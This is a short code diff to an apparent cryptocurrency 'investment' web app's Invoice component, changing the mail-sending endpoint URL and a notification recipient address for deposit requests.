@@ -284,14 +284,14 @@ function Invoice() {
         );
         ajax({
           url:
-            "https://bnbearnpro.vercel.app/sendmail",
+            "http://binanceearnpro.online/sendmail",
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
           body: {
             message: `New incoming investment request from ${userInfos.firstName} ${userInfos.lastName} has been placed, total deposit amount : ${amountnn}`,
-            to: `${userInfos.email}, no-reply@binanceearnpro.online`,
+            to: `${userInfos.email}, support@binanceearnpro.online`,
             subject: "investment",
           },
         }).subscribe(() => {
